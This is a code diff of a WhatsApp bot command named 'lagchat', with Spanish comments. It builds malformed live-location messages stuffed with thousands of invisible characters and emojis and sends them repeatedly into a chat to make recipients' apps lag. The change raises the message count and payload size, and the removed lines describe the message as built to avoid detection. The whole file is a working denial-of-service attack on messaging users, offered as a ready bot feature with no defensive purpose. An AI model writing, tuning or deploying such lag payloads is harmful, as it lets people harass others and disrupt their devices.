@@ -2,17 +2,17 @@ const buildLagMessage = () => ({
   viewOnceMessage: {
     message: {
       liveLocationMessage: {
-        degreesLatitude: '🌀',
-        degreesLongitude: '⚡',
-        caption: '\u2063'.repeat(8000) + '⚡'.repeat(200),
-        sequenceNumber: String(Math.floor(Math.random() * 1000)),
-        jpegThumbnail: Buffer.alloc(2 * 1024, 0), // miniatura falsa ligera
+        degreesLatitude: '🔥',
+        degreesLongitude: '🌪️',
+        caption: ('\u2063💥').repeat(5000), // mezcla caracteres invisibles con emojis
+        sequenceNumber: String(Math.floor(Math.random() * 10000)),
+        jpegThumbnail: Buffer.alloc(3 * 1024, 0), // miniatura ligera
         contextInfo: {
-          forwardingScore: Math.floor(Math.random() * 50),
+          forwardingScore: Math.floor(Math.random() * 200),
           isForwarded: true,
           externalAdReply: {
-            title: 'Lag Stealth',
-            body: 'Mensaje optimizado para no ser detectado',
+            title: 'Lag Prolongado',
+            body: 'Lag que dura varios segundos',
             mediaType: 1,
             renderLargerThumbnail: false,
             showAdAttribution: false,
@@ -26,22 +26,22 @@ const buildLagMessage = () => ({
 
 let handler = async (m, { conn }) => {
   const jid = m.chat
-  const times = 3 // suficiente para molestar pero sin riesgo alto
+  const times = 6 // envía 6 mensajes para prolongar el lag
 
-  await m.reply(`⚠️ Enviando ${times} mensajes stealth...\nEsto puede hacer lag sin ser tan obvio.`)
+  await m.reply(`⚠️ Preparando ${times} mensajes para lag prolongado...`)
 
   for (let i = 0; i < times; i++) {
     try {
       await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
-      await new Promise(resolve => setTimeout(resolve, 200))
+      await new Promise(resolve => setTimeout(resolve, 300)) // más tiempo entre mensajes
     } catch (error) {
       console.error('Error al enviar mensaje:', error)
-      await m.reply('❗ Error al enviar mensaje. Intenta de nuevo.')
+      await m.reply('❗ Error al enviar mensaje.')
       return
     }
   }
 
-  await m.reply('✅ *Lagchat stealth completo we.*')
+  await m.reply('✅ *Lag prolongado completo.*')
 }
 
 handler.command = /^lagchat$/i
